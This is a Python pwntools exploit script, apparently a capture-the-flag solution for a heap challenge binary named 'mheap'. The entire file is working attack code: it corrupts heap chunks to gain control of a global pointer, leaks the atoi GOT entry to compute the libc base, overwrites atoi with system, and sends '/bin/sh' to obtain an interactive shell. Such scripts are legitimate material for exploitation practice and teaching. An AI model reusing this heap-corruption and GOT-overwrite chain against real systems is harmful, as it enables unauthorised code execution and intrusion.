#coding=utf-8
from pwn import *
local = 1
exec_file="./mheap"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file)
if local :
    a=process(exec_file)
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    a=remote("")

def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    set $ptr=0x0000000004040E0
    b *0x0000000004011EA
    '''
    gdb.attach(a,script)

def menu(idx):
    a.sendlineafter("Your choice: ",str(idx))
def add(idx,size,content):
    menu(1)
    a.sendlineafter("Index: ",str(idx))
    a.sendlineafter("Input size: ",str(size))
    a.sendafter("Content: ",content)
def delete(idx):
    menu(3)
    a.sendlineafter("Index: ",str(idx))
def show(idx):
    menu(2)
    a.sendlineafter("Index: ",str(idx))
def edit(idx,content):
    menu(4)
    a.sendlineafter("Index: ",str(idx))
    a.send(content)

ptr=0x0000000004040E0
add(0,0xfe0-32,'AAA\n')#0
add(1,1,'A')#1
add(2,0x100,'BABA\n')#2
delete(1)
debug()
edit(2,p64(0x20)*2+p64(ptr)+'A'*(45-8-8-8+3-1)+p64(ptr)+'\n')
#debug()
add(3,15,'BBBB\n')
#debug()
atoi_got=elf.got["atoi"]
add(4,0x23330010-0x10,p64(atoi_got)*2+'\n')
show(2)
libc_base=u64(a.recv(6)+'\x00\x00')-libc.symbols["atoi"]
print hex(libc_base)
system_addr=libc_base+libc.symbols["system"]
menu(4)
a.sendlineafter("Index: ",str(2))
a.send(p64(system_addr)+'\n')
#edit(3,'AAAA\n')
#debug()
a.sendlineafter("Your choice: ","/bin/sh\x00\n")
a.interactive()









